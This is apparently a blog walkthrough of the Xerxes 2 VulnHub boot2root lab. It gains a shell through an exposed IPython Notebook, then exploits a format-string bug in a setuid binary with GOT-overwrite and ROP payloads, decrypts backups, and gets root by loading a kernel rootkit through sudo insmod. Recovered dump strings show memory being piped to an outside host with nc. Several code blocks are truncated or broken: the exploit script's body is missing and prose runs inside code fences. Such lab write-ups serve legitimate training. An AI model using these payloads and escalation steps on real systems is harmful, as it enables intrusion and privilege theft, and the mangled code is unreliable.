Another month, another hacking challenge! This time it's Xerxes 2 by [barrebas](https://twitter.com/barrebas). This boot2root promised some challenges and it definitely delivered. Xerxes 1 was a lot of fun, and when Xerxes 2 was announced, I was looking forward to getting my hands dirty. As with other boot2roots, you can download a copy of Xerxes 2 at [VulnHub](http://vulnhub.com/entry/xerxes-2,97/)

It occurred to me that I never wrote a writeup for Xerxes 1 after I completed it. I can't imagine why, but it's something that I'll have to do in the near future. For Xerxes 2 however, an [incentive](https://twitter.com/barrebas/status/497715061046398976) was given to complete a writeup:

> \#xerxes2 stickers arrived! Grab \#xerxes2 from http://vulnhub.com , root it, write it up & I'll send you stickers!

Stickers?! Oh yeah!

Like other medium difficulty boot2roots these days, Xerxes 2 consists of multiple challenges that need to be overcome before you are able to complete it. The goal is to read the contents of /root/flag.txt.

### Level 1: Delacroix

Using netdiscover I identifed the Xerxes 2 IP address as 172.16.229.155. A quick port scan with [onetwopunch.sh](/2012/05/31/port-scanning-one-two-punch/) revealed several open ports. 

```
root@kali ~/xerxes2
# echo 172.16.229.155 > ip.txt

root@kali ~/xerxes2

57916/tcp open  status  1 (RPC #100024)

```

As it turned out, most of these ports were red herrings with the exception of port 8888. Running on port 8888 was actually an IPython Notebook.

From here I identified the first user, delacroix. Nothing much to see on this page so I clicked on New Notebook which took me to another webpage where I could enter my commands if I prefixed them with an exclamation point.

To get a proper shell, I wrote my SSH key into delacroix's .ssh/authorized_keys file and made sure the permissions were set correctly.

Once that was set, I logged into the server as delacroix.

```
root@kali ~/xerxes2
# ssh delacroix@172.16.229.155

delacroix@xerxes2:~$ 
```

A quick look around at the system revealed two more users, polito and korenchkin. There was also a program /opt/bf that was setuid and owned by user polito, and an encrypted tarball /opt/backup/korenchkin.tar.enc

delacroix's home directory contained a C program called bf.c. After studying it for a bit, I came to the realization that this was the source code for a Brainfuck interpreter. Brainfuck is an esoteric programming language which also made a small appearance in Xerxes 1. [Wikipedia](http://en.wikipedia.org/wiki/Brainfuck) has a good explanation on how it works. 

I had a feeling /opt/bf might be exploitable so I spent a bit more time examining bf.c and found a format string vulnerability. printf() on line 78 was being called without specifying the format string:  

```c
case '#':
        // new feature 
        printf(buf);
        break;  
```

This meant I could provide my own format string and overwrite some memory address somewhere and hopefully gain control of the program. 

I use [peda](https://github.com/longld/peda) for exploit development on Linux, so I uploaded my peda directory over to delacroix's home directory and created the following .gdbinit file:

```text
source ~/peda/peda.py
set disable-randomization off
```

/proc/sys/kernel/randomize_va_space was set to 2, which meant ASLR was enabled. To make exploitation easier, I used a trick to disable the randomization of function addresses: 

```
ulimit -s unlimited
```

I loaded /opt/bf into gdb and ran checksec to see what other security measures had been compiled into the binary:

```
delacroix@xerxes2:~$ gdb -q /opt/bf
Reading symbols from /opt/bf...(no debugging symbols found)...done.
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : disabled
gdb-peda$ 
```

NX was enabled which meant I couldn't execute shellcode on the stack. Having gained a better idea of what I was up against, I started analyzing the program's behavior.

I knew it had format string bug, so I sent it a  format string that would print out the contents of the stack:

```
delacroix@xerxes2:~$ python -c 'print "AAAA" + "%p."*20' | /opt/bf `python -c 'print ",>"*100'`\#
AAAA0x40185ff4.(nil).(nil).0xbfef4448.0x400139c0.0x64.0xc8.0xbfeecf10.0x40185ff4.0xbfef4448.0x80486eb.0xbfef48be.0xbfeecf10.0x7530.(nil).0x41414141.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.
�����������������������������������delacroix@xerxes2:~$ 
```

The 16th item on the stack, 0x41414141, was the start of my format string. I could replace 0x41414141 with an address of a function referenced in the Global Offset Table (GOT), and then overwrite that reference to point to instructions I wanted to execute instead.

Using objdump, I looked at what functions were in the GOT: 

```
delacroix@xerxes2:~$ objdump -R /opt/bf

/opt/bf:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
08049a38 R_386_GLOB_DAT    __gmon_start__
08049a48 R_386_JUMP_SLOT   printf
08049a4c R_386_JUMP_SLOT   getchar
08049a50 R_386_JUMP_SLOT   __gmon_start__
08049a54 R_386_JUMP_SLOT   exit
08049a58 R_386_JUMP_SLOT   __libc_start_main
08049a5c R_386_JUMP_SLOT   memset
08049a60 R_386_JUMP_SLOT   putchar
```

I decided to overwite exit's GOT reference to an instruction that would pivot me back into an area I controlled on the stack. This area would contain my ROP gadgets that would eventually setup the stack such that I could call system("/bin/sh"). 

In order to have bf read my format string from within gdb, I had to save it into a file and redirect that file into gdb's run command. 

```
printf '\x54\x9a\x04\x08\x55\x9a\x04\x08\x56\x9a\x04\x08-%%10c%%16$hn-%%10c%%17$hn-%%10c%%18$hn' > in
```

This would perform three writes into addresses 0x08049a54, 0x08049a55, and 0x08049a56, which allowed me to change it to whatever address I wanted. I tested this in gdb and confirmed that the overwrite was successful when a segmentation fault was triggered after exit() was called: 

```
gdb-peda$ r `python -c 'print ",>"*45'`# < in

Program received signal SIGSEGV, Segmentation fault.

exit() was now jumping to 0x2d2217, an invalid address. Now I needed to pivot back into the stack to an area I controlled. A quick look at the stack at the time of the crash showed the following:

The format string I input into the buffer could be found at offset 32 from the stack. That was where I needed to pivot to. Using vmmap, I identified additional libraries linked to bf that I could use for hunting gadgets:  

```
gdb-peda$ vmmap

0x40187000 0x4018b000 rw-p  mapped
0xbfc23000 0xbfc44000 rw-p  [stack]
```

/lib/i386-linux-gnu/ld-2.13.so and /lib/i386-linux-gnu/i686/cmov/libc-2.13.so were linked to bf, so I downloaded those along with bf over to my machine. To find the gadgets, I used [ropeme](http://www.vnsecurity.net/2010/08/ropeme-rop-exploit-made-easy/). 

The first thing I loaded was bf and I immediately found a gadget that would remove 44 bytes from the top of the stack: 

```
root@kali ~/xerxes2
# ropshell.py

ROPeMe> search add esp %
Searching for ROP gadget:  add esp % with constraints: []
0x804867eL: add esp 0x24 ; pop ebx ; pop ebp ;;
```

I set a breakpoint at 0x080486f2 which was the call to exit() in main(). Using a bit of math, I adjusted the field widths so that exit's reference in the GOT would be overwritten to 0x804867e: 

```
printf '\x54\x9a\x04\x08\x55\x9a\x04\x08\x56\x9a\x04\x08-%%113c%%16$hn-%%263c%%17$hn-%%1661c%%18$hn' > in
```

I ran it within gdb and once the breakpoint got triggered at the call to exit(), I stepped into the function and saw that it was now about to execute the first gadget: 

```

0x08048683 in bf ()
```
The top of the stack contained the format string I sent to bf. The ret instruction which would be executed next would pop the value at the top of the stack into EIP and execution would be redirected there. I just needed to add in my ROP payload in this area so that when ret executed, it would redirect execution to the next gadget.  

I found the majority of the gadgets I needed from libc-2.13.so. With ASLR already disabled, I looked up the addresses for system() and /bin/sh: 

```
gdb-peda$ p system
$1 = {<text variable, no debug info>} 0x40062000 <system>
gdb-peda$ find "/bin/sh"
Searching for '/bin/sh' in: None ranges
Found 1 results, display max 1 items:
libc : 0x40161b94 ("/bin/sh")
```

After a couple of hours, I crafted the following ROP payload that called system("/bin/sh") into a Python script: 

```python
#!/usr/bin/env python

"""
 disable ASLR using: ulimit -s unlimited

 after this, system() can be found at 0x40062000 and /bin/sh at 0x40161b94

 execute using the following to get shell: 

 (./sploit.py ; cat) | /opt/bf `python -c 'print ",>"*90'`\#
"""

The comments should hopefully be pretty clear on what the payload is doing. I executed the exploit and got a shell:

uid=1002(delacroix) gid=1002(delacroix) euid=1001(polito) egid=1001(polito) groups=1001(polito),1002(delacroix)
```

cat was required to keep the shell from terminating too quickly. I ran the id command which confirmed I now had EUID and EGID polito. 


### Level 2: Polito

This shell wasn't very usable, so as before, I added my SSH public key into polito's .ssh/authorized_keys file so I could SSH in and get a proper shell. Once I had logged in, I noticed three interesting files in polito's home directory:

```
polito@xerxes2:~$ ls -l
total 43932
-rw-r--r-- 1 polito polito   142564 Jul 16 10:57 audio.txt
-rw-r--r-- 1 polito polito 44813850 Jul 16 12:17 dump.gpg
-rw-r--r-- 1 polito polito    27591 Jul 16 12:19 polito.pdf
```

audio.txt was a red herring; basically some audio file piped into port 4444 that would taunt you. dump.gpg was some kind of password protected encrypted file, and polito.pdf offered some clue regarding dump.gpg

![](/images/2014-08-08/04.png)

Scanning the QR code revealed yet another taunt from Xerxes. 

I suspected that there was some hidden message inside the PDF. Fellow hacker [recrudesce](https://twitter.com/recrudesce) who was also working on the challenge and bouncing ideas off me thought that it might be a PDF hidden in the PDF. I remembered reading about something like that in a [PoC||GTFO](http://openwall.info/wiki/people/solar/pocorgtfo) issue. Unfortunately, I had to leave Xerxes 2 alone for a day after a busy work load and being exhausted overall. The following morning, recrudesce had solved this challenge and hinted that I should check the file type of polito.pdf, which I did:

```
polito@xerxes2:~$ file polito.pdf 
polito.pdf: x86 boot sector, code offset 0xe0
```

Now I definitely knew I'd seen something like this before. I poured through the PoC||GTFO issues and found the answer on the second page of issue 2:

> Ange Albertini explains the internal organization of this issue’s PDF in Section 8. Curious readers might want to run **qemu-system-i386 -fda pocorgtfo02.pdf** in order to experience all the neighbor- liness that this issue has to offer

I ran qemu-system-i386 and passed it polito.pdf as its argument and got the password for dump.gpg:

![](/images/2014-08-08/05.png)

Using the password, I was able to decrypt the dump file: 

```
polito@xerxes2:~$ gpg --passphrase amFuaWNl dump.gpg 
gpg: CAST5 encrypted data
gpg: encrypted with 1 passphrase
gpg: WARNING: message was not integrity protected
polito@xerxes2:~$ ls -l
total 172960
-rw-r--r-- 1 polito polito    142564 Jul 16 10:57 audio.txt
-rw-r--r-- 1 polito polito 132120576 Aug  8 21:15 dump
-rw-r--r-- 1 polito polito  44813850 Jul 16 12:17 dump.gpg
-rw-r--r-- 1 polito polito     27591 Jul 16 12:19 polito.pdf
```

This was a binary file, so I examined it using strings and piped it into less. At around lines 54795-54830, I saw something interesting:

```
cat /home/korenchkin/.ssh/id_rsa
dd if=/dev/fmem of=/root/xerxesmem bs=1M count=128
dd if=/dev/fmem of=/root/xerxesmem bs=1M count=128
cd volatility-2.3.1/
cat xerxesmem |nc 172.16.32.1 5555
root@xerxes2:~/fmem_1.6-0# 
cat Debian7.zip | nc 172.16.32.1 5555
/home/korenchkin/.ssh/id_rsa
```

korenchkin's id_rsa file was being read and then the contents of /dev/fmem were being dumped into /root/xerxesmem, which was them being piped into some service running on port 5555. I suspected that service wrote the contents of xerxesmem into the dump file. 

At first I searched for references to korenchkin's id_rsa key, and I did find an RSA key in there, but it didn't work. So then I started searching for instances of korenchkin and found something more promising:

```
tar -cvf /opt/backup/korenchkin.tar ~/
openssl enc -e -salt -aes-256-cbc -pass pass:c2hvZGFu -in /opt/backup/korenchkin.tar -out /opt/backup/korenchkin.tar.enc
rm /opt/backup/korenchkin.tar
```

The command and password used to encrypt korenchkin.tar was right there, so I simply reversed it to decrypt korenchkin.tar.enc

```
polito@xerxes2:~$ openssl enc -d -salt -aes-256-cbc -pass pass:c2hvZGFu -in /opt/backup/korenchkin.tar.enc -out korenchkin.tar
polito@xerxes2:~$ ls -l korenchkin.tar 
-rw-r--r-- 1 polito polito 10240 Aug  8 21:33 korenchkin.tar
```

The decryption was successful. I unpacked the tarball and extracted korenchkin's private and public SSH keys. 

```
polito@xerxes2:~$ tar xvf korenchkin.tar 
.ssh/id_rsa
.ssh/id_rsa.pub
```

I copied id_rsa over to my machine, renamed it as korenchkin_rsa, and set its permissions to read only so that SSH wouldn't complain. With that done, I logged in as korenchkin using the following command:

```
# ssh -i korenchkin_rsa korenchkin@172.16.229.155
```

### Level 3: Korenchkin

This was the last user on the system, so I assumed that from here on, the goal was to escalate to root. After a bit of poking around, I found that korenchkin had sudo rights to execute /sbin/insmod and /sbin/rmmod. 

```
korenchkin@xerxes2:~$ sudo -l
Matching Defaults entries for korenchkin on this host:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User korenchkin may run the following commands on this host:
    (root) NOPASSWD: /sbin/insmod, (root) /sbin/rmmod
You have new mail in /var/mail/korenchkin
```

The first thing that came to my mind was to load up a rootkit. Since I don't deal much with rootkits, I had to Google around for a simple one and eventually settled on a sample rootkit over at [https://github.com/ivyl/rootkit](https://github.com/ivyl/rootkit). 

unzip didn't seem to be available on Xerxes 2, so I unpacked the rootkit on my machine and transferred the contents to korenchkin's home directory. From there, building it was a matter of running make:

```
korenchkin@xerxes2:~/rootkit-master$ make
make -C /lib/modules/3.2.0-4-686-pae/build M=/home/korenchkin/rootkit-master modules
make[1]: Entering directory `/usr/src/linux-headers-3.2.0-4-686-pae'
  CC [M]  /home/korenchkin/rootkit-master/rt.o
  Building modules, stage 2.
  MODPOST 1 modules
  CC      /home/korenchkin/rootkit-master/rt.mod.o
  LD [M]  /home/korenchkin/rootkit-master/rt.ko
make[1]: Leaving directory `/usr/src/linux-headers-3.2.0-4-686-pae'
```

This created the rt.ko module which I loaded into the system using sudo:

```
korenchkin@xerxes2:~/rootkit-master$ sudo insmod rt.ko
```

Finally, to get the root shell I issued the following command to the rootkit:

```
korenchkin@xerxes2:~/rootkit-master$ tools/rtcmd.py mypenislong /bin/bash
root@xerxes2:~/rootkit-master# id
uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(korenchkin)
root@xerxes2:~/rootkit-master# 
```

After three days of on and off hacking away at it, I was finally able to read /root/flag.txt

```
root@xerxes2:~/rootkit-master# cat /root/flag.txt 
____   ___  ____  ___  __ ____   ___  ____     ____     ____

	congratulations on beating xerxes2!

	I hope you enjoyed it as much as I did making xerxes2. 
	xerxes1 has been described as 'weird' and 'left-field'
	and I hope that this one fits that description too :)

	Many thanks to @TheColonial & @rasta_mouse for testing!

	Ping me on #vulnhub for thoughts and comments!

Hooray!

### Final thoughts

Xerxes 2 has the right amount of balance between frustration as you try to solve a challenge, and the reward you get when you finally do solve it. I thoroughly enjoyed it and now I know more Brainfuck then I ever cared to learn. And also stickers!
